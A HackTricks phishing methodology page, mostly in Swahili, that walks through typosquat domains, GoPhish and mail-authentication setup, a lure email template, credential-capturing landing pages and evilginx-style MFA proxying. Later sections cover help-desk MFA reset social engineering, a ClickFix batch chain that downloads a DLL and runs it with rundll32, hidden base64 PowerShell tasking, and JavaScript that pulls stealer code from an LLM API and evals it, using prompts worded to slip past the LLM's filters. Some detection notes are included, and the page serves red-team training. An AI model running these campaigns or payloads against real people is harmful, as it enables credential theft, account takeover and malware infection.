# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Mbinu

1. Recon the victim
1. Chagua **victim domain**.
2. Fanya ukaguzi wa wavuti wa msingi kwa **kutafuta login portals** zinazotumika na victim na **amua** ni ipi utakayo **impersonate**.
3. Tumia **OSINT** ili **kupata emails**.
2. Andaa mazingira
1. **Nunua domain** utakayotumia kwa tathmini ya phishing
2. **Sanidi rekodi za huduma ya email** zinazohusiana (SPF, DMARC, DKIM, rDNS)
3. Sanidi VPS na **gophish**
3. Andaa kampeni
1. Andaa **email template**
2. Andaa **web page** ya kuiba credentials
4. Anzisha kampeni!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Jina la domain **linajumuisha** keyword muhimu ya domain ya asili (mfano, zelster.com-management.com).
- **hypened subdomain**: Badilisha **dot kwa hyphen** ya subdomain (mfano, www-zelster.com).
- **New TLD**: Tumia domain ile ile kwa **New TLD** (mfano, zelster.org)
- **Homoglyph**: Inabadilisha herufi ndani ya jina la domain kwa **herufi zinazofanana kwa muonekano** (mfano, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Inabadili nafasi za herufi mbili ndani ya jina la domain (mfano, zelsetr.com).
- **Singularization/Pluralization**: Inaongeza au kuondoa “s” mwishoni mwa jina la domain (mfano, zeltsers.com).
- **Omission**: Inatoa moja ya herufi kutoka kwenye jina la domain (mfano, zelser.com).
- **Repetition:** Inarudia moja ya herufi katika jina la domain (mfano, zeltsser.com).
- **Replacement**: Kama homoglyph lakini isiyo ya siri sana. Inabadilisha moja ya herufi, pengine kwa herufi iliyo karibu kwenye keyboard (mfano, zektser.com).
- **Subdomained**: Ingiza **dot** ndani ya jina la domain (mfano, ze.lster.com).
- **Insertion**: Inaweka herufi ndani ya jina la domain (mfano, zerltser.com).
- **Missing dot**: Ambatisha TLD kwenye jina la domain. (mfano, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zinazopelekwa kwa mawasiliano zinaweza kubadilika kwa moja kwa moja** kutokana na sababu mbalimbali kama solar flares, cosmic rays, au makosa ya hardware.

Wakati wazo hili **linapotumika kwa maombi ya DNS**, inawezekana kwamba **domain inayopokelewa na DNS server** si ile ile ile iliyohitajika awali.

Kwa mfano, mabadiliko ya bit moja ndani ya domain "windows.com" inaweza kuibadilisha kuwa "windnws.com."

Wavamizi wanaweza **kuitumia hili kwa kusajili multiple bit-flipping domains** zinazofanana na domain ya victim. Kusudi lao ni kupeleka watumiaji halali kwenye miundombinu yao.

Kwa habari zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Unaweza kutafuta kwenye [https://www.expireddomains.net/](https://www.expireddomains.net) domain iliyokwisha muda wake ambayo unaweza kutumia.\
Ili kuhakikisha kwamba domain iliyokwisha muda ambayo unataka kununua **ina tayari SEO nzuri**, unaweza kuangalia jinsi ilivyokataliwa kwenye:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **gundua zaidi** anwani halali za email au **kukagua zile** tayari umegundua unaweza kujaribu ku-brute-force SMTP servers za victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Zaidi ya hayo, usisahau kwamba kama watumiaji wanatumia **any web portal to access their mails**, unaweza kuangalia kama inakabiliwa na **username brute force**, na ku-exploit kama inawezekana.

## Configuring GoPhish

### Installation

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na decompress ndani ya `/opt/gophish` na endesha `/opt/gophish/gophish`\
Utapewa password ya admin user kwenye port 3333 kwenye output. Kwa hivyo, ingia kwenye port hiyo na tumia credentials hizo kubadilisha admin password. Huenda ukahitaji ku-tunnel port hiyo kwa local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Usanidi

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii unapaswa kuwa **tayari umenunua domain** utakayotumia na lazima iwe **ikielekeza** kwenye **IP ya VPS** ambapo unasanidi **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Usanidi wa barua**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza kikoa kwenye mafaili yafuatayo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Badilisha pia thamani za vigezo vifuatavyo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Mwisho, badilisha mafaili **`/etc/hostname`** na **`/etc/mailname`** kwa kikoa chako na **anzisha upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwa **ip address** ya VPS na rekodi ya **DNS MX** inayoelekeza kwa `mail.<domain>`

Sasa tujaribu kutuma barua pepe:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Usanidi wa Gophish**

Simamisha utekelezaji wa Gophish na tui-sanidi.\
Badilisha `/opt/gophish/config.json` kuwa ifuatayo (zingatia matumizi ya https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish ili iweze kuanzishwa kiotomatiki na kusimamiwa kama huduma, unaweza kuunda faili `/etc/init.d/gophish` yenye yaliyomo yafuatayo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Maliza kusanidi huduma na kuikagua ikifanya:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Kusanidi mail server na domain

### Subiri & kuwa halali

Kadri domain ilivyo ya zamani ndivyo uwezekano wake wa kutambuliwa kama spam unavyopungua. Kwa hivyo unapaswa kusubiri muda mwingi iwezekanavyo (angalau wiki 1) kabla ya tathmini ya phishing. Zaidi ya hayo, ikiwa utaweka ukurasa kuhusu sekta yenye sifa nzuri, sifa itakayopatikana itakuwa bora.

Kumbuka kwamba hata ukihitaji kusubiri wiki unaweza kumaliza kusanidi kila kitu sasa.

### Sanidi Reverse DNS (rDNS) rekodi

Weka rekodi ya rDNS (PTR) inayoweka suluhisho la anwani ya IP ya VPS kwa jina la domain.

### Sender Policy Framework (SPF) Record

Unapaswa **kusanidi rekodi ya SPF kwa domain mpya**. Ikiwa haujui rekodi ya SPF ni nini [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kuunda sera yako ya SPF (tumia anwani ya IP ya mashine ya VPS)

![](<../../images/image (1037).png>)

Huu ndio yaliyomo yanayopaswa kuwekwa ndani ya rekodi ya TXT katika domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekodi ya DMARC (Domain-based Message Authentication, Reporting & Conformance)

Unapaswa **kusanidi rekodi ya DMARC kwa domaini mpya**. Ikiwa haujui ni rekodi ya DMARC ni nini [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Unahitaji kuunda rekodi mpya ya DNS TXT inayolenga hostname `_dmarc.<domain>` na yaliyomo yafuatayo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa haujui ni nini rekodi ya DMARC [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 ambazo kiufunguo cha DKIM kinazalisha:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wa barua pepe yako

Unaweza kufanya hivyo kwa kutumia [https://www.mail-tester.com/](https://www.mail-tester.com/)\
Fungua ukurasa na utume barua pepe kwa anwani watakokupa:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Unaweza pia **kukagua usanidi wa email yako** kwa kutuma email kwa `check-auth@verifier.port25.com` na **kusoma jibu** (hii itahitaji **ufungue** port **25** na kuona jibu katika faili _/var/mail/root_ ikiwa utatuma email kama root).\
Hakikisha unapita mitihani yote:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Unaweza pia kutuma **ujumbe kwa Gmail chini ya udhibiti wako**, na ukague **vichwa vya barua pepe** katika kisanduku chako cha mapokezi cha Gmail, `dkim=pass` inapaswa kuwepo katika sehemu ya kichwa `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Kuondolewa kutoka Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) inaweza kukuonyesha ikiwa domain yako inazuiliwa na spamhouse. Unaweza kuomba domain/IP yako iondolewe kwa: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondolewa kutoka Microsoft Blacklist

​​Unaweza kuomba domain/IP yako iondolewe kwenye [https://sender.office.com/](https://sender.office.com).

## Unda na Anzisha Kampeni ya GoPhish

### Wasifu wa Kutuma

- Weka baadhi ya **jina la kutambulisha** wasifu wa mtumaji
- Amua kutoka akaunti gani utakayotumia kutuma barua pepe za phishing. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha wazi jina la mtumiaji na nenosiri, lakini hakikisha umechagua Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inashauriwa kutumia kipengele cha "**Send Test Email**" kujaribu kwamba kila kitu kinafanya kazi.\
> Napendekeza **kutuma barua za mtihani kwa anwani za 10min mails** ili kuepuka kuingizwa kwenye orodha nyeusi wakati wa kufanya majaribio.

### Kiolezo cha Barua Pepe

- Weka baadhi ya **jina la kutambulisha** kiolezo
- Kisha andika **subject** (hakuna kitu cha ajabu, kitu unachoweza kutarajia kusoma katika barua pepe ya kawaida)
- Hakikisha umechagua "**Add Tracking Image**"
- Andika **kiolezo cha barua pepe** (unaweza kutumia vigezo kama katika mfano ufuatao):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Kumbuka kwamba **ili kuongeza uhalali wa barua pepe**, inapendekezwa kutumia saini kutoka kwa barua pepe kutoka kwa mteja. Mapendekezo:

- Tuma barua pepe kwa **anwani isiyokuwepo** na angalia ikiwa jibu lina saini yoyote.
- Tafuta **public emails** kama info@ex.com au press@ex.com au public@ex.com na utume barua pepe kisha subiri jibu.
- Jaribu kuwasiliana na **barua pepe halali uliyoibua** na subiri jibu

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template pia inaruhusu **kuambatanisha faili za kutuma**. Ikiwa pia ungependa kuiba NTLM challenges kwa kutumia baadhi ya faili/nyaraka zilizotengenezwa maalum [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Kurasa ya Kutua

- Andika **jina**
- **Andika HTML code** ya ukurasa wa wavuti. Kumbuka unaweza **import** kurasa za wavuti.
- Weka alama **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Kawaida utahitaji kubadilisha HTML code ya ukurasa na kufanya majaribio kwa local (labda kwa kutumia Apache server) **hadi utakaporidhika na matokeo.** Kisha, andika HTML code hiyo kwenye kisanduku.\
> Kumbuka kwamba ikiwa unahitaji **kutumia some static resources** kwa ajili ya HTML (labda baadhi ya CSS na JS pages) unaweza kuzihifadhi katika _**/opt/gophish/static/endpoint**_ kisha kuzipata kutoka _**/static/\<filename>**_

> [!TIP]
> Kwa ajili ya redirection unaweza **kupelekesha watumiaji kwenye legit main web page** ya mwathirika, au kuwadirect kwenda _/static/migration.html_ kwa mfano, weka **spinning wheel (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha onyesha kuwa mchakato umefanikiwa**.

### Watumiaji & Makundi

- Weka jina
- **Import the data** (kumbuka ili kutumia template kwa mfano unahitaji jina la kwanza, jina la mwisho na anwani ya barua pepe ya kila mtumiaji)

![](<../../images/image (163).png>)

### Kampeni

Hatimaye, unda kampeni kwa kuchagua jina, the email template, the landing page, the URL, the sending profile na kundi. Kumbuka kwamba URL itakuwa link itakayotumwa kwa waathiriwa

Kumbuka kwamba **Sending Profile inaruhusu kutuma test email kuona jinsi barua pepe ya mwisho ya phishing itakavyoonekana**:

![](<../../images/image (192).png>)

> [!TIP]
> Ningependekeza **kutuma test emails kwa anwani za 10min mails** ili kuepuka kuorodheshwa kama mweusi wakati wa majaribio.

Mara kila kitu kiko tayari, anza kampeni tu!

## Kuiga Tovuti

Ikiwa kwa sababu yoyote ungependa kuiga tovuti angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Nyaraka na Faili Zenye Backdoor

Katika baadhi ya tathmini za phishing (hasa kwa Red Teams) utataka pia **kutuma faili zenye aina fulani ya backdoor** (labda C2 au labda kitu kitakachoanzisha authentication).\
Angalia ukurasa ufuatao kwa baadhi ya mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Kupitia Proxy MitM

Shambulio lililotangulia ni janja kwani unafanya copia ya tovuti halisi na kukusanya seti ya taarifa za mtumiaji. Kwa bahati mbaya, ikiwa mtumiaji hakutoa password sahihi au ikiwa application uliyoiga imewekwa na 2FA, **hizi taarifa hazitakuwezesha kuiga mtumiaji aliyefumwa**.

Hapa ndipo zana kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinakuwa muhimu. Zana hizi zitakuwezesha kutengeneza shambulio la MitM. Kwa ujumla, shambulio hufanya kazi kwa njia ifuatayo:

1. Unaiiga fomu ya **login** ya ukurasa halisi.
2. Mtumiaji hutuma **credentials** zake kwenye ukurasa wako wa uongo na zana huzituma kwa ukurasa halisi, **kuangalia kama credentials zinafanya kazi**.
3. Ikiwa akaunti imewekwa na **2FA**, ukurasa wa MitM utaomba 2FA na mara **mtumiaji aingize** itatumwa kwa ukurasa halisi.
4. Mara mtumiaji anapothibitishwa wewe (kama mshambulizi) utakuwa umepata **credentials, 2FA, cookie na taarifa yoyote** ya kila mwingiliano wakati zana inafanya MitM.

### Kupitia VNC

Badala ya **kumtuma mwathirika kwenye ukurasa mbaya** unaofanana na asili, unamtuma kwenye **kikao cha VNC chenye browser iliyounganishwa na ukurasa halisi**? Utaweza kuona anachofanya, kuiba password, MFA iliyotumika, cookies...\
Unaweza kufanya hili kwa kutumia [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Kugundua Umegunduliwa

Kweli, mojawapo ya njia bora za kujua kama umebust ni **kutafuta domain yako ndani ya blacklists**. Ikiwa inaonekana imesajiliwa, kwa namna fulani domain yako ilitambuliwa kama ya kushukiwa.\
Njia moja rahisi ya kuangalia ikiwa domain yako inaonekana kwenye blacklist ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua ikiwa mwathirika ana **kutafuta kwa bidii shughuli za phishing zinazoshukiwa** kama ilivyoelezwa katika:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya mwathirika **na/au kuunda certificate** kwa **subdomain** ya domain unayotawala **iyayoonyesha** **keyword** ya domain ya mwathirika. Ikiwa **mwathirika** atafanya aina yoyote ya **DNS au HTTP interaction** nazo, utajua kuwa **anatafuta kwa bidii** domain zinazoshukiwa na utahitaji kuwa mwangalifu sana.

### Tathmini phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious) kutathmini ikiwa barua pepe yako itaishia kwenye folda ya spam, itazuiwa au itafanikiwa.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Seti za uvamizi za kisasa zaidi zinaepuka kabisa vionjo vya barua pepe na **kwa moja hualenga workflow ya service-desk / identity-recovery** ili kuvunja MFA. Shambulio ni kabisa "living-off-the-land": mara operator atakapomiliki credentials halali wanatumia zana za ndani za admin – hakuna malware inahitajika.

### Mtiririko wa shambulio
1. Recon the victim
* Kusanya taarifa binafsi & za kampuni kutoka LinkedIn, uvunjaji wa data, GitHub ya umma, n.k.
* Tambua watambulisho wenye thamani kubwa (executives, IT, finance) na orodhesha **mchakato kamili wa help-desk** kwa ajili ya reset ya password / MFA.
2. Real-time social engineering
* Piga simu, tumia Teams au chat help-desk huku ukijiiga kuwa mhusika (mara nyingi kwa **spoofed caller-ID** au **cloned voice**).
* Toa PII uliokusanya hapo awali ili kupita uthibitisho wa aina ya maarifa.
* Mshawishi afanye **reset ya MFA secret** au kufanya **SIM-swap** kwenye namba ya simu iliyosajiliwa.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
  * MFA method changed + authentication from new device / geo.
  * Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## Udanganyifu kwa Wingi – SEO Poisoning & “ClickFix” Kampeni
Mafurushi ya kawaida yanapunguza gharama za operesheni za high-touch kwa mashambulio ya wingi yanayotumia **search engines & ad networks kama chaneli ya kusambaza**.

1. **SEO poisoning / malvertising** inasukuma matokeo ya uongo kama `chromium-update[.]site` hadi kwenye matangazo ya juu ya search.
2. Mwathiriwa anapakua loader ndogo ya **first-stage** (mara nyingi JS/HTA/ISO). Mifano iliyoshuhudiwa:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader humtoa cookies za browser + credential DBs, kisha hupakua **silent loader** ambayo inaamua – *kwa wakati halisi* – kama itawatoa:
* RAT (kwa mfano AsyncRAT, RustDesk)
* ransomware / wiper
* sehemu ya persistence (registry Run key + scheduled task)

### Vidokezo vya kuimarisha
* Zuia domains zilizosajiliwa hivi karibuni & tekeleza **Advanced DNS / URL Filtering** kwa *search-ads* pamoja na barua pepe.
* Zuia usakinishaji wa software kwa packages zilizotiwa saini tu (MSI / Store), kata utekelezaji wa `HTA`, `ISO`, `VBS` kwa policy.
* Fuata mchakato wa watoto wa browser wanaofungua installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Tafuta LOLBins zinazotumika mara kwa mara na first-stage loaders (kwa mfano `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: ushauri uliokopia wa national CERT wenye kitufe cha **Update** kinachoonyesha maelekezo ya hatua kwa hatua ya “fix”. Waathiriwa wanaambiwa wendeni tumia batch inayopakua DLL na kuiendesha kupitia `rundll32`.
* Mnyororo wa batch wa kawaida ulioonekana:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` inaweka payload kwenye `%TEMP%`, kutoa usingizi mfupi kunaficha mtetemo wa mtandao, kisha `rundll32` inaita entrypoint iliyohamishwa (`notepad`).
* DLL inajulisha utambulisho wa mwenyeji na inafuta C2 kila dakika chache. Maagizo ya mbali yanakuja kama **base64-encoded PowerShell** inayotekelezwa kwa siri na bila kufuata policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Hii inahifadhi unyumbufu wa C2 (server inaweza kubadilisha kazi bila kusasisha DLL) na inaficha madirisha ya console. Tafuta PowerShell watoto wa `rundll32.exe` kutumia `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` kwa pamoja.
* Wadhambihaji wanaweza kutafuta callbacks za HTTP(S) za aina `...page.php?tynor=<COMPUTER>sss<USER>` na vipindi vya polling vya dakika 5 baada ya DLL kuwasili.

---

## AI-Enhanced Phishing Operations
Wavamizi sasa wanachanganya **LLM & voice-clone APIs** kwa vionjo vilivyobinafsishwa kabisa na mwingiliano kwa wakati halisi.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Ongeza **dynamic banners** zinazobainisha ujumbe uliopelekwa kwa automation isiyojulikana (kupitia ARC/DKIM anomalies).  
• Tekeleza **voice-biometric challenge phrases** kwa simu zenye hatari kubwa.  
• Endelea kuiga vionjo vilivyotengenezwa na AI katika programu za uelewa – templates za static zimepitwa na wakati.

Angalia pia – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Angalia pia – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Wavamizi wanaweza kutuma HTML ya kuonekana safi na **kutengeneza stealer wakati wa runtime** kwa kumuomba **trusted LLM API** JavaScript, kisha kuiendesha ndani ya browser (mfano, `eval` au dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings ndani ya prompt; rudia maneno ili kupita filters za usalama na kupunguza hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** kode iliyotengenezwa inabinafsisha mtego (e.g., LogoKit token parsing) na inapost creds kwa prompt-hidden endpoint.

**Sifa za kuepuka**
- Trafiki inaenda kwa vikoa vya LLM vinavyotambulika au proxies za CDN zenye sifa nzuri; mara nyingi kupitia WebSockets hadi backend.
- Hakuna static payload; JS hasidi inapatikana tu baada ya render.
- Mizalishaji isiyotabirika hutengeneza **unique** stealers kwa kila kikao.

**Mawazo za kugundua**
- Endesha sandboxes zenye JS imewezeshwa; weka alama kwa **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Tafuta front-end POSTs kwenda LLM APIs zifuatazo mara moja na `eval`/`Function` kwenye maandishi yaliyorejeshwa.
- Toa tahadhari kuhusu vikoa vya LLM visivyoidhinishwa katika trafiki ya client pamoja na POSTs za credential zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na classic push-bombing, waendeshaji kwa urahisi wanaweza **force a new MFA registration** wakati wa simu ya help-desk, kuifanya token ya mtumiaji iliyopo isitumike. Kila ombi la kuingia linalofuata linaonekana halali kwa mhanga.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** yanatokea **ndani ya dakika kutoka IP ile ile**.



## Clipboard Hijacking / Pastejacking

Washambuliaji wanaweza kwa ukimya kunakili amri zenye madhara kwenye clipboard ya mwathirika kutoka kwenye ukurasa ulio compromise au typosquatted na kisha kumdanganya mtumiaji kuiweka (paste) ndani ya **Win + R**, **Win + X** au dirisha la terminal, kutekeleza code yoyote bila upakuaji wala kiambatisho.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* APK hujaza static credentials na per-profile “unlock codes” (hakuna server auth). Waathiriwa hufuata mtiririko wa udanganyifu wa udhanifu (login → locked profiles → unlock) na, kwa codes sahihi, hupelekwa kwenye mazungumzo ya WhatsApp na nambari za mshambuliaji `+92` wakati spyware inaendesha kimya.
* Ukusanyaji huanza hata kabla ya login: exfil mara moja ya **device ID**, contacts (kama `.txt` kutoka cache), na nyaraka (images/PDF/Office/OpenXML). A content observer hujipakia picha mpya moja kwa moja; scheduled job hure-scan kwa nyaraka mpya kila **5 dakika**.
* Persistence: inajiandikisha kwa `BOOT_COMPLETED` na inahifadhi **foreground service** hai ili kustahimili reboots na kuondolewa kwa background.

### WhatsApp device-linking hijack via QR social engineering
